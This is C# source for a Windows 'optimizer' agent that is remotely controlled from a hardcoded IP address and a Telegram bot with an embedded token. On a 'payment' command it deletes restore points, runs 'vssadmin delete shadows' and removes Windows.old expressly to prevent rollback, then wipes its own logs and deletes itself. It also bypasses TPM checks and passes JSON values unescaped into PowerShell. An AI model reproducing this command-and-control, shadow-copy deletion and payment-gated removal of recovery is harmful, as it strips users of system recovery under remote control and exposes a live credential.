using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;

namespace WinOptimizerAgent;

/// <summary>
/// WinOptimizer Agent v2.0 — System Restore rollback + deep clean payment.
/// Rollback: System Restore Point → reboot (пріоритет), або manual service/startup restore.
/// Payment: видалити restore point → cleanup → self-delete.
/// </summary>
class Program
{
    [DllImport("srclient.dll")]
    static extern int SRRemoveRestorePoint(int dwRPNum);

    static readonly string DataDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WinOptimizer", "Data");

    static readonly string LogFile = Path.Combine(DataDir, "agent.log");
    static readonly string ClientIdFile = Path.Combine(DataDir, "client_id.txt");
    static readonly string RollbackFile = Path.Combine(DataDir, "rollback_state.json");
    static readonly string LangpackResumeFile = Path.Combine(DataDir, "langpack_resume.json");

    // Desktop log — видимий файл для діагностики!
    static readonly string DesktopLogFile = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
        "WinOptimizer_Agent.log");

    static readonly string VpsApi = "http://84.238.132.84/api";
    static readonly string TgBotToken = "8394906281:AAEhRCN2hJxV7uPfZw-UnISXcAcHEHonago";
    static readonly string TgChatId = "942720632";

    static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(15) };
    static string ClientId = "UNKNOWN";

    static void Main(string[] args)
    {
        try
        {
            Directory.CreateDirectory(DataDir);
            Log("=== WinOptimizerAgent v2.1 started ===");

            // Read client ID
            if (File.Exists(ClientIdFile))
                ClientId = File.ReadAllText(ClientIdFile).Trim();
            Log($"Client ID: {ClientId}");

            // Check if rollback state file exists
            var hasRollback = File.Exists(RollbackFile);
            var rollbackInfo = "немає";
            if (hasRollback)
            {
                try
                {
                    var rj = File.ReadAllText(RollbackFile);
                    using var rd = JsonDocument.Parse(rj);
                    var rp = rd.RootElement.TryGetProperty("RestorePointSequenceNumber", out var rpVal) ? rpVal.GetInt32() : 0;
                    rollbackInfo = $"RP#{rp}";
                }
                catch { rollbackInfo = "файл є, помилка парсингу"; }
            }

            // Send startup TG notification (CRITICAL for debugging)
            SendTg($"🤖 WinOptimizer Agent v2.1 STARTED\n" +
                   $"🖥 {Environment.MachineName}\n" +
                   $"🆔 {ClientId}\n" +
                   $"📁 Rollback state: {rollbackInfo}\n" +
                   $"📂 Data dir: {DataDir}\n" +
                   $"⏰ {DateTime.Now:yyyy-MM-dd HH:mm:ss}");

            // Register on VPS
            RegisterOnVps();

            // === Check for langpack resume (after reboot for language pack) ===
            if (File.Exists(LangpackResumeFile))
            {
                Log(">>> LANGPACK RESUME FILE FOUND! Starting Windows upgrade after langpack reboot...");
                SendTg($"🔄 Agent: langpack resume detected!\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Waiting 60s for system to stabilize...");

                // Чекаємо 60 секунд щоб Windows повністю завантажився
                Thread.Sleep(60000);

                try
                {
                    ResumeLangpackUpgrade();
                }
                catch (Exception resumeEx)
                {
                    Log($"Langpack resume FAILED: {resumeEx}");
                    SendTg($"❌ Langpack resume FAILED!\n🆔 {ClientId}\n{resumeEx.Message}");
                }
            }

            // Main loop
            int heartbeatCount = 0;
            while (true)
            {
                try
                {
                    heartbeatCount++;
                    Heartbeat();

                    // Send periodic status to TG every 10 minutes (20 heartbeats * 30s)
                    if (heartbeatCount % 20 == 0)
                    {
                        Log($"Heartbeat #{heartbeatCount} — agent alive");
                    }
                }
                catch (Exception ex)
                {
                    Log($"Heartbeat error: {ex.Message}");
                }

                Thread.Sleep(30000); // 30 sec
            }
        }
        catch (Exception ex)
        {
            Log($"FATAL: {ex}");
            SendTg($"💀 Agent FATAL CRASH\n🆔 {ClientId}\n{ex.Message}");
        }
    }

    static void RegisterOnVps()
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                hwid = ClientId,
                pc_name = Environment.MachineName,
                status = "agent_running",
                project = "winoptimizer"
            });

            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var response = Http.PostAsync($"{VpsApi}/register", content).Result;
            Log($"VPS register: {response.StatusCode}");
        }
        catch (Exception ex)
        {
            Log($"VPS register error: {ex.Message}");
        }
    }

    static void Heartbeat()
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                status = "agent_running",
                project = "winoptimizer"
            });

            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var response = Http.PostAsync($"{VpsApi}/heartbeat", content).Result;
            var json = response.Content.ReadAsStringAsync().Result;
            Log($"Heartbeat response: {json}");

            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            if (root.TryGetProperty("pending_action", out var action))
            {
                var actionStr = action.GetString();
                if (!string.IsNullOrEmpty(actionStr) && actionStr != "none")
                {
                    Log($">>> PENDING ACTION RECEIVED: '{actionStr}'");
                    SendTg($"📬 Agent отримав команду!\n🆔 {ClientId}\n📋 Action: {actionStr}\n⏰ {DateTime.Now:HH:mm:ss}");

                    var act = actionStr.ToLowerInvariant();

                    if (act.Contains("rollback"))
                    {
                        Log(">>> Executing ROLLBACK...");
                        ExecuteRollback();
                    }
                    else if (act.Contains("paid") || act.Contains("payment"))
                    {
                        Log(">>> Executing PAYMENT...");
                        ExecutePayment();
                    }
                    else
                    {
                        Log($"Unknown action: {actionStr}");
                        SendTg($"❓ Agent: невідома команда\n{actionStr}");
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Log($"Heartbeat error: {ex.Message}");
        }
    }

    static void ExecuteRollback()
    {
        Log("=== ROLLBACK START ===");
        SendTg($"🔄 WinFlow Rollback\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Починаємо відкат...");

        try
        {
            if (!File.Exists(RollbackFile))
            {
                Log("No rollback state found");
                SendTg($"⚠️ Rollback: файл стану не знайдено\n🆔 {ClientId}");
                return;
            }

            var json = File.ReadAllText(RollbackFile);
            Log($"Rollback state content: {json.Substring(0, Math.Min(json.Length, 500))}");
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            // Check rollback type: "cleanup" (System Restore) or "upgrade" (DISM)
            var rollbackType = "cleanup";
            if (root.TryGetProperty("Type", out var typeVal))
                rollbackType = typeVal.GetString()?.ToLowerInvariant() ?? "cleanup";

            // Fallback: якщо Type не задано, перевіряємо UpgradePerformed
            if (rollbackType == "cleanup" && root.TryGetProperty("UpgradePerformed", out var upg) && upg.GetBoolean())
            {
                rollbackType = "upgrade";
                Log("Type was 'cleanup' but UpgradePerformed=true → switching to 'upgrade'");
            }

            Log($"Rollback type: {rollbackType}");

            if (rollbackType == "upgrade")
            {
                // DISM rollback — real OS upgrade rollback via Windows.old
                ExecuteUpgradeRollback(root);
                return;
            }

            // Cleanup rollback — System Restore
            ExecuteCleanupRollback(root);
        }
        catch (Exception ex)
        {
            Log($"ROLLBACK ERROR: {ex}");
            SendTg($"❌ Rollback FAILED\n🆔 {ClientId}\n{ex.Message}");
        }
    }

    /// <summary>
    /// Rollback for cleanup scenario — uses System Restore Point.
    /// </summary>
    static void ExecuteCleanupRollback(JsonElement root)
    {
        int seqNum = 0;
        if (root.TryGetProperty("RestorePointSequenceNumber", out var rpSeq))
            seqNum = rpSeq.GetInt32();

        Log($"Cleanup rollback: RestorePointSequenceNumber = {seqNum}");

        if (seqNum > 0)
        {
            // Step 1: Verify restore point exists
            Log("Checking if restore point exists...");
            var checkCmd = $"Get-ComputerRestorePoint | Where-Object {{ $_.SequenceNumber -eq {seqNum} }} | Format-List";
            var checkOutput = RunPowerShellWithOutput(checkCmd, 30000);
            Log($"Restore point check: {(string.IsNullOrWhiteSpace(checkOutput) ? "NOT FOUND!" : checkOutput.Trim())}");

            // Also list all restore points
            var listCmd = "Get-ComputerRestorePoint | Select-Object SequenceNumber,Description,CreationTime | Format-Table -AutoSize";
            var listOutput = RunPowerShellWithOutput(listCmd, 15000);
            Log($"All restore points:\n{listOutput}");

            if (string.IsNullOrWhiteSpace(checkOutput))
            {
                Log($"Restore point #{seqNum} NOT FOUND! Cannot restore.");
                SendTg($"❌ Restore point #{seqNum} не знайдено!\n🆔 {ClientId}\nМожливо точка була видалена.");
                UpdateVpsStatus("rollback_failed_no_rp");
                return;
            }

            // Step 2: Initiate System Restore via Restore-Computer
            Log($"Initiating Restore-Computer -RestorePoint {seqNum}...");
            SendTg($"🔄 System Restore\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📍 Точка #{seqNum}\n⏳ Restore-Computer запускається...\nПК перезавантажиться автоматично!");

            var restoreCmd = $"Restore-Computer -RestorePoint {seqNum} -Confirm:$false";
            var restoreOutput = RunPowerShellWithOutput(restoreCmd, 120000);
            Log($"Restore-Computer output: {restoreOutput}");

            // Backup reboot
            ScheduleReboot("WinFlow: System Restore");
            UpdateVpsStatus("rollback_system_restore");
            SendTg($"✅ System Restore ініційовано!\n🆔 {ClientId}\n📍 Точка #{seqNum}\n🔄 ПК перезавантажується...");
            return;
        }

        // Fallback: Manual rollback (services + startup only)
        Log("No restore point (seqNum=0), manual rollback");
        int restoredServices = 0;
        int restoredStartup = 0;

        if (root.TryGetProperty("DisabledServices", out var services))
        {
            foreach (var svc in services.EnumerateArray())
            {
                var name = svc.GetProperty("ServiceName").GetString() ?? "";
                var startType = svc.GetProperty("OriginalStartType").GetString() ?? "Manual";
                Log($"Restoring service: {name} → {startType}");
                RunPowerShell($"Set-Service -Name '{name}' -StartupType {startType}; Start-Service -Name '{name}' -ErrorAction SilentlyContinue");
                restoredServices++;
            }
        }

        if (root.TryGetProperty("DisabledStartupItems", out var startup))
        {
            foreach (var item in startup.EnumerateArray())
            {
                var regPath = item.GetProperty("RegistryPath").GetString() ?? "";
                var valueName = item.GetProperty("ValueName").GetString() ?? "";
                var valueData = item.GetProperty("ValueData").GetString() ?? "";
                Log($"Restoring startup: {valueName}");
                RunPowerShell($"Set-ItemProperty -Path '{regPath}' -Name '{valueName}' -Value '{valueData}' -Force");
                restoredStartup++;
            }
        }

        File.Delete(RollbackFile);
        Log($"Manual rollback done: {restoredServices} services, {restoredStartup} startup items");
        SendTg($"✅ Manual Rollback OK\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n🔧 Служб: {restoredServices}\n🚀 Автозапуск: {restoredStartup}");
        UpdateVpsStatus("rollback_manual_done");
    }

    /// <summary>
    /// Rollback for real OS upgrade — uses DISM /Online /Initiate-OSUninstall.
    /// Windows.old must exist for this to work.
    /// </summary>
    static void ExecuteUpgradeRollback(JsonElement root)
    {
        var previousOs = "Windows";
        if (root.TryGetProperty("PreviousOS", out var prevVal))
            previousOs = prevVal.GetString() ?? "Windows";

        Log($"Upgrade rollback: returning to {previousOs}");
        SendTg($"🔄 Upgrade Rollback\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📍 Повернення до {previousOs}\n⏳ DISM Initiate-OSUninstall...");

        // Step 1: Check if Windows.old exists
        var winOldPath = @"C:\Windows.old";
        if (!Directory.Exists(winOldPath))
        {
            Log("Windows.old NOT FOUND! Cannot rollback upgrade.");
            SendTg($"❌ Windows.old не знайдено!\n🆔 {ClientId}\nНеможливо відкатити оновлення.\nПапка C:\\Windows.old видалена.");
            UpdateVpsStatus("rollback_failed_no_winold");
            return;
        }

        Log($"Windows.old exists at {winOldPath}");

        // Step 2: Check uninstall window (how many days left)
        var checkCmd = "DISM /Online /Get-OSUninstallWindow 2>&1";
        var checkOutput = RunPowerShellWithOutput(checkCmd, 30000);
        Log($"OS Uninstall Window: {checkOutput.Trim()}");

        // Step 3: Extend uninstall window to 60 days (safety)
        var extendCmd = "DISM /Online /Set-OSUninstallWindow /Value:60 2>&1";
        var extendOutput = RunPowerShellWithOutput(extendCmd, 30000);
        Log($"Extend uninstall window: {extendOutput.Trim()}");

        // Step 4: Initiate OS uninstall (rollback to previous Windows)
        Log("Initiating DISM /Online /Initiate-OSUninstall...");
        var dismCmd = "DISM /Online /Initiate-OSUninstall 2>&1";
        var dismOutput = RunPowerShellWithOutput(dismCmd, 120000);
        Log($"DISM output: {dismOutput.Trim()}");

        // Check if DISM succeeded or if we need to use alternative method
        if (dismOutput.Contains("Error") || dismOutput.Contains("error"))
        {
            Log("DISM failed, trying alternative reagentc method...");

            // Alternative: Use reagentc
            var reagentCmd = "reagentc /boottore 2>&1";
            var reagentOutput = RunPowerShellWithOutput(reagentCmd, 30000);
            Log($"Reagentc output: {reagentOutput.Trim()}");
        }

        // Backup reboot
        ScheduleReboot("WinFlow: OS Rollback");
        UpdateVpsStatus("rollback_upgrade_dism");
        SendTg($"✅ Upgrade Rollback ініційовано!\n🆔 {ClientId}\n📍 Повернення до {previousOs}\n🔄 ПК перезавантажується...");
    }

    /// <summary>
    /// Schedule a forced reboot as backup.
    /// </summary>
    static void ScheduleReboot(string reason)
    {
        Log("Scheduling backup reboot in 30 seconds...");
        var sys32 = GetRealSystem32();
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = Path.Combine(sys32, "shutdown.exe"),
                Arguments = $"/r /t 30 /c \"{reason} — перезавантаження\"",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(psi);
            Log("Backup reboot scheduled (30s)");
        }
        catch (Exception ex)
        {
            Log($"Shutdown schedule error: {ex.Message}");
        }
    }

    static void ExecutePayment()
    {
        Log("=== PAYMENT START ===");
        SendTg($"💰 WinFlow Payment\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Очистка...");
        var wasUpgrade = false; // Для TG повідомлення в кінці

        try
        {
            // Read rollback state and clean up
            if (File.Exists(RollbackFile))
            {
                try
                {
                    var json = File.ReadAllText(RollbackFile);
                    Log($"Rollback state: {json.Substring(0, Math.Min(json.Length, 300))}");
                    using var doc = JsonDocument.Parse(json);
                    var root = doc.RootElement;

                    // Check type
                    var payType = "cleanup";
                    if (root.TryGetProperty("Type", out var typeVal))
                        payType = typeVal.GetString()?.ToLowerInvariant() ?? "cleanup";

                    // Fallback: якщо Type не задано, перевіряємо UpgradePerformed
                    if (payType == "cleanup" && root.TryGetProperty("UpgradePerformed", out var upg) && upg.GetBoolean())
                    {
                        payType = "upgrade";
                        Log("Type was 'cleanup' but UpgradePerformed=true → switching to 'upgrade'");
                    }

                    if (payType == "upgrade")
                    {
                        wasUpgrade = true;
                        // Upgrade: delete Windows.old to free space and prevent rollback
                        Log("Upgrade payment: deleting Windows.old...");
                        var delCmd = @"takeown /F C:\Windows.old /R /D Y 2>&1; icacls C:\Windows.old /grant administrators:F /T 2>&1; rd /s /q C:\Windows.old 2>&1; Write-Output 'done'";
                        var delOutput = RunPowerShellWithOutput(delCmd, 120000);
                        Log($"Delete Windows.old: {delOutput.Trim()}");
                    }
                    else
                    {
                        // Cleanup: delete restore point
                        if (root.TryGetProperty("RestorePointSequenceNumber", out var rpSeq))
                        {
                            var seqNum = rpSeq.GetInt32();
                            if (seqNum > 0)
                            {
                                Log($"Deleting restore point #{seqNum} via SRRemoveRestorePoint...");
                                var result = SRRemoveRestorePoint(seqNum);
                                Log(result == 0
                                    ? $"✅ Restore point #{seqNum} deleted successfully"
                                    : $"⚠️ SRRemoveRestorePoint returned {result} (0=success)");

                                if (result != 0)
                                {
                                    Log("Trying PowerShell fallback delete...");
                                    var psResult = RunPowerShellWithOutput(
                                        $"vssadmin delete shadows /for=C: /quiet 2>&1; Write-Output 'done'", 30000);
                                    Log($"PS delete result: {psResult.Trim()}");
                                }
                            }
                            else
                            {
                                Log("No restore point to delete (seqNum=0)");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log($"Payment cleanup error: {ex.Message}");
                }

                File.Delete(RollbackFile);
                Log("Rollback state file deleted");
            }
            else
            {
                Log("No rollback state file found");
            }

            // Delete scheduled task
            var sys32 = GetRealSystem32();
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = Path.Combine(sys32, "schtasks.exe"),
                    Arguments = "/Delete /TN \"WinOptimizerAgent\" /F",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(psi)?.WaitForExit(5000);
                Log("Scheduled task deleted");
            }
            catch (Exception ex)
            {
                Log($"Delete task error: {ex.Message}");
            }

            // Get C: size
            var cFreeGB = "?";
            try
            {
                var di = new DriveInfo("C");
                cFreeGB = $"{di.AvailableFreeSpace / (1024.0 * 1024 * 1024):F1}";
            }
            catch { }

            var cleanupInfo = wasUpgrade
                ? "🗑 Windows.old видалено — rollback заблоковано"
                : "🗑 Restore point видалено";

            SendTg($"✅ WinOptimizer Payment OK\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n💾 C: {cFreeGB} GB вільно\n{cleanupInfo}");

            UpdateVpsStatus("paid_done");

            // Self-delete
            SelfDelete();
        }
        catch (Exception ex)
        {
            Log($"PAYMENT ERROR: {ex}");
            SendTg($"❌ Payment FAILED\n🆔 {ClientId}\n{ex.Message}");
        }
    }

    /// <summary>
    /// Resume Windows upgrade after langpack reboot.
    /// Agent reads langpack_resume.json → mounts ISO → starts setup.exe.
    /// </summary>
    static void ResumeLangpackUpgrade()
    {
        Log("=== LANGPACK RESUME START ===");

        var json = File.ReadAllText(LangpackResumeFile);
        Log($"Resume data: {json}");

        using var doc = JsonDocument.Parse(json);
        var root = doc.RootElement;
        var isoPath = root.GetProperty("isoPath").GetString() ?? "";
        var language = root.TryGetProperty("language", out var langProp) ? langProp.GetString() ?? "uk" : "uk";
        var version = root.TryGetProperty("version", out var verProp) ? verProp.GetString() ?? "10" : "10";

        if (string.IsNullOrEmpty(isoPath) || !File.Exists(isoPath))
        {
            Log($"❌ ISO file not found: {isoPath}");
            SendTg($"❌ Langpack resume: ISO not found\n🆔 {ClientId}\n📁 {isoPath}");
            File.Delete(LangpackResumeFile);
            return;
        }

        Log($"ISO: {isoPath}");
        Log($"Language: {language}, Version: {version}");

        // Verify current language after reboot
        var langCheck = RunPowerShellWithOutput(
            "(Get-UICulture).Name + ' | InstallLang=' + (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language').InstallLanguage",
            15000);
        Log($"Post-reboot language: {langCheck.Trim()}");

        SendTg($"🔄 Langpack resume: mounting ISO\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📁 {Path.GetFileName(isoPath)}\n🌐 Lang: {langCheck.Trim()}");

        // Mount ISO
        var mountScript = $@"
            $iso = '{isoPath.Replace("'", "''")}'
            $result = Mount-DiskImage -ImagePath $iso -PassThru -ErrorAction Stop
            $vol = $result | Get-Volume
            $letter = $vol.DriveLetter
            Write-Output ""DRIVE=$letter""
        ";
        var mountResult = RunPowerShellWithOutput(mountScript, 30000);
        Log($"Mount result: {mountResult.Trim()}");

        var driveLetter = "";
        foreach (var line in mountResult.Split('\n'))
        {
            if (line.Trim().StartsWith("DRIVE="))
                driveLetter = line.Trim().Split('=').Last().Trim();
        }

        if (string.IsNullOrEmpty(driveLetter))
        {
            Log("❌ Failed to mount ISO — no drive letter");
            SendTg($"❌ Langpack resume: ISO mount failed\n🆔 {ClientId}");
            File.Delete(LangpackResumeFile);
            return;
        }

        var setupExe = $@"{driveLetter}:\setup.exe";
        if (!File.Exists(setupExe))
        {
            Log($"❌ setup.exe not found at: {setupExe}");
            SendTg($"❌ Langpack resume: setup.exe not found\n🆔 {ClientId}\n📁 {setupExe}");
            File.Delete(LangpackResumeFile);
            return;
        }

        Log($"setup.exe found: {setupExe}");

        // Apply TPM/CPU bypass for safety
        var bypassScript = @"
            $regPath = 'HKLM:\SYSTEM\Setup\MoSetup'
            if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            Set-ItemProperty -Path $regPath -Name 'AllowUpgradesWithUnsupportedTPMOrCPU' -Value 1 -Type DWord -Force
            Write-Output 'BYPASS=OK'
        ";
        var bypassResult = RunPowerShellWithOutput(bypassScript, 10000);
        Log($"TPM bypass: {bypassResult.Trim()}");

        // Clean previous setup remnants
        var cleanScript = @"
            if (Test-Path 'C:\$WINDOWS.~BT') {
                try { Remove-Item -Path 'C:\$WINDOWS.~BT' -Recurse -Force -ErrorAction SilentlyContinue } catch {}
            }
            Write-Output 'CLEAN=OK'
        ";
        RunPowerShellWithOutput(cleanScript, 30000);

        // TRY 1: setup.exe /auto upgrade
        Log("=== TRY 1: setup.exe /auto upgrade ===");
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = setupExe,
                Arguments = "/auto upgrade",
                UseShellExecute = true,
                WorkingDirectory = $@"{driveLetter}:\"
            };
            Process.Start(psi);
            Log("setup.exe /auto upgrade started");

            Thread.Sleep(5000);

            // Check if still running
            var setupProcs = Process.GetProcessesByName("setup");
            var setupPreps = Process.GetProcessesByName("setupprep");
            if (setupProcs.Length > 0 || setupPreps.Length > 0)
            {
                Log("✅ Windows Setup is running after /auto upgrade!");
                SendTg($"✅ Langpack resume: Windows {version} upgrade STARTED!\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n🌐 {langCheck.Trim()}\n📁 {Path.GetFileName(isoPath)}");

                File.Delete(LangpackResumeFile);
                Log("Resume file deleted. Agent continues heartbeat.");
                return;
            }

            Log("setup.exe /auto upgrade exited quickly — trying GUI mode");
        }
        catch (Exception ex)
        {
            Log($"TRY 1 failed: {ex.Message}");
        }

        // TRY 2: GUI mode (plain setup.exe — no arguments)
        Log("=== TRY 2: setup.exe (GUI mode) ===");
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = setupExe,
                UseShellExecute = true,
                WorkingDirectory = $@"{driveLetter}:\"
            };
            Process.Start(psi);
            Log("setup.exe (GUI mode) started");

            Thread.Sleep(5000);

            var setupProcs = Process.GetProcessesByName("setup");
            var setupPreps = Process.GetProcessesByName("setupprep");
            if (setupProcs.Length > 0 || setupPreps.Length > 0)
            {
                Log("✅ Windows Setup GUI is running!");
                SendTg($"✅ Langpack resume: Windows {version} Setup GUI started!\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⚠️ AutoClicker потрібен для GUI mode");
            }
            else
            {
                Log("⚠️ setup.exe not detected after TRY 2");
                SendTg($"⚠️ Langpack resume: setup.exe may have failed\n🆔 {ClientId}");
            }
        }
        catch (Exception ex)
        {
            Log($"TRY 2 failed: {ex.Message}");
            SendTg($"❌ Langpack resume: setup.exe failed\n🆔 {ClientId}\n{ex.Message}");
        }

        File.Delete(LangpackResumeFile);
        Log("Resume file deleted.");
    }

    static void SelfDelete()
    {
        try
        {
            var exePath = Process.GetCurrentProcess().MainModule?.FileName;
            if (string.IsNullOrEmpty(exePath)) return;

            var agentDir = Path.GetDirectoryName(exePath) ?? "";
            var batPath = Path.Combine(Path.GetTempPath(), "wo_cleanup.cmd");

            // Also cleanup Desktop logs and Data dir
            var desktopDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
            var deployLog = Path.Combine(desktopDir, "WinOptimizer_Deploy.log");
            var agentDesktopLog = DesktopLogFile;
            var dataDir = DataDir;

            var script = $"""
                @echo off
                timeout /t 3 /nobreak >nul
                taskkill /F /IM WinOptimizerAgent.exe >nul 2>&1
                timeout /t 2 /nobreak >nul
                rd /s /q "{agentDir}" >nul 2>&1
                del /f /q "{deployLog}" >nul 2>&1
                del /f /q "{agentDesktopLog}" >nul 2>&1
                rd /s /q "{dataDir}" >nul 2>&1
                del "%~f0" >nul 2>&1
                """;

            File.WriteAllText(batPath, script);
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c \"{batPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            });

            Log("Self-delete scheduled");
        }
        catch (Exception ex)
        {
            Log($"Self-delete error: {ex.Message}");
        }
    }

    // pending_action is auto-cleared by VPS API on heartbeat response

    static void UpdateVpsStatus(string status)
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                rollback_status = status,
                project = "winoptimizer"
            });
            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            Http.PostAsync($"{VpsApi}/heartbeat", content).Wait();
        }
        catch { }
    }

    static void RunPowerShell(string command)
    {
        RunPowerShellWithOutput(command, 30000);
    }

    static string RunPowerShellWithOutput(string command, int timeoutMs = 30000)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{command}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return "";

            var stdout = proc.StandardOutput.ReadToEnd();
            var stderr = proc.StandardError.ReadToEnd();
            proc.WaitForExit(timeoutMs);

            if (!string.IsNullOrWhiteSpace(stderr))
                Log($"PS stderr: {stderr.Trim()}");

            return stdout;
        }
        catch (Exception ex)
        {
            Log($"PowerShell error: {ex.Message}");
            return "";
        }
    }

    static string GetRealSystem32()
    {
        var winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        var sysnative = Path.Combine(winDir, "Sysnative");
        if (Directory.Exists(sysnative) && File.Exists(Path.Combine(sysnative, "schtasks.exe")))
            return sysnative;
        return Environment.GetFolderPath(Environment.SpecialFolder.System);
    }

    static void SendTg(string message)
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                chat_id = TgChatId,
                text = message
            });
            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var resp = Http.PostAsync($"https://api.telegram.org/bot{TgBotToken}/sendMessage", content).Result;
            var body = resp.Content.ReadAsStringAsync().Result;
            Log($"TG send: {resp.StatusCode}, body: {body.Substring(0, Math.Min(body.Length, 200))}");
        }
        catch (Exception ex)
        {
            Log($"TG SEND ERROR: {ex.Message}");
            // Inner exception often has the real error
            if (ex.InnerException != null)
                Log($"TG INNER: {ex.InnerException.Message}");
        }
    }

    static void Log(string message)
    {
        var line = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}";
        try { File.AppendAllText(LogFile, line + Environment.NewLine); } catch { }
        // Також пишемо на Public Desktop — завжди видно!
        try { File.AppendAllText(DesktopLogFile, line + Environment.NewLine); } catch { }
    }
}
